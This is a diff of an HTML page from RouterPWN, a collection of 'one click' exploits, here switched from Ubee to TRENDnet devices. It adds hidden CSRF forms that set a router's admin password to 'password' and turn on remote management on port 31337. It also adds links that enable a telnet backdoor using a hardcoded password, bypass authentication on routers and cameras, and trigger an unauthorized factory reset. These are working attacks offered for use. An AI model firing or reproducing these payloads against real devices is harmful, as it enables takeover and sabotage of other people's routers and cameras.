@@ -2,7 +2,7 @@
 <html>
  <head>
   <title>
-   RouterPWN - Ubee - One click exploits, News, Vulnerabilities, POC, Alerts
+   RouterPWN - TRENDnet - One click exploits, News, Vulnerabilities, POC, Alerts
   </title>
   <link href="includes/images/favicon.png" rel="apple-touch-icon"/>
   <link href="includes/images/favicon.ico" rel="shortcut icon"/>
@@ -76,9 +76,9 @@
     </tr>
     <tr>
      <td>
-      <section id="ubee">
+      <section id="trendnet">
        <h1>
-        Ubee
+        TRENDnet
        </h1>
        <table cellspacing="0" class="display" id="tabla" width="100%">
         <thead>
@@ -120,28 +120,185 @@
          </tr>
         </tfoot>
         <tbody>
+         <form action="http://192.168.10.1/setSysAdm.cgi" id="trendCSRF" method="post" name="trendCSRF">
+          <input name="page" type="hidden" value="/adm/management.asp"/>
+          <input name="admuser" type="hidden" value="admin"/>
+          <input name="admpass" type="hidden" value="password"/>
+          <input name="AuthTimeout" type="hidden" value="600"/>
+         </form>
+         <form action="http://192.168.10.1/uapply.cgi" id="trendCSRF2" method="post" name="trendCSRF2">
+          <input name="page" type="hidden" value="/adm/management.asp"/>
+          <input name="remote_en" type="hidden" value="1"/>
+          <input name="http_wanport" type="hidden" value="31337"/>
+          <input name="action" type="hidden" value="Apply"/>
+          <input name="apply_do" type="hidden" value="setRemoteManagement"/>
+         </form>
          <tr>
           <td>
-           02/20/14
+           08/13/13
           </td>
           <td>
            One click
           </td>
           <td>
-           <a href="https://github.com/hkm/www.routerpwn.com/issues/32">
-            github.com
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            Securityevaluators.com
            </a>
           </td>
           <td>
-           <a href="javascript:ubecablemas_bypass()">
-            Ubee Cablemas - Auth Bypass
+           <a href="http://192.168.10.1/backdoor?password=j78G-DFdg_24Mhw3">
+            TEW 812DRU TEW-692GR TEW-691GR Enable Telnet Backdoor
            </a>
-           <a href="javascript:ubecablemas_bypass(ip)" onclick="return ip=prompt('IP:');">
+           <a href="javascript:setip('/backdoor?password=j78G-DFdg_24Mhw3')">
             [SET IP]
            </a>
           </td>
           <td>
-           Author
+           Jacob Holcomb
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/13/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            Securityevaluators.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:trend23pwn()">
+            TEW 812DRU CSRF Enable remote telnet
+           </a>
+           <a href="javascript:trend23pwn()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+            Jacob	Holcomb
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/13/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            Securityevaluators.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:document.trendCSRF.submit()">
+            TEW 812DRU CSRF Change Admin Credentials
+           </a>
+           <a href="javascript:trendCSRF()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+            Jacob	Holcomb
+          </td>
+         </tr>
+         <tr>
+          <td>
+           08/13/13
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://securityevaluators.com/content/case-studies/routers/Vulnerability_Catalog.pdf">
+            Securityevaluators.com
+           </a>
+          </td>
+          <td>
+           <a href="javascript:document.trendCSRF2.submit()">
+            TEW 812DRU CSRF Enable Remote Management
+           </a>
+           <a href="javascript:trendCSRF2()">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           Jacob	Holcomb
+          </td>
+         </tr>
+         <tr>
+          <td>
+           01/10/12
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://console-cowboys.blogspot.com.au/2012/01/trendnet-cameras-i-always-feel-like.html">
+            Console-cowboys.blogspot.com.au
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.10.30/anony/mjpg.cgi">
+            TV-IP Cameras authentication bypass
+           </a>
+           <a href="javascript:setip('/anony/mjpg.cgi')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           someLuser
+          </td>
+         </tr>
+         <tr>
+          <td>
+           02/26/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.gnucitizen.org/projects/router-hacking-challenge/">
+            Gnucitizen.org
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.10.1/Basic/Wireless.shtml">
+            TEW-633GR A-to-C authentication bypass
+           </a>
+           <a href="javascript:setip('/Basic/Wireless.shtml')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           pdp
+          </td>
+         </tr>
+         <tr>
+          <td>
+           02/26/08
+          </td>
+          <td>
+           One click
+          </td>
+          <td>
+           <a href="http://www.gnucitizen.org/projects/router-hacking-challenge/">
+            Gnucitizen.org
+           </a>
+          </td>
+          <td>
+           <a href="http://192.168.10.1/reboot.cgi?reset=true">
+            TEW-633GR unauthorized factory reset
+           </a>
+           <a href="javascript:setip('/reboot.cgi?reset=true')">
+            [SET IP]
+           </a>
+          </td>
+          <td>
+           pdp
           </td>
          </tr>
         </tbody>
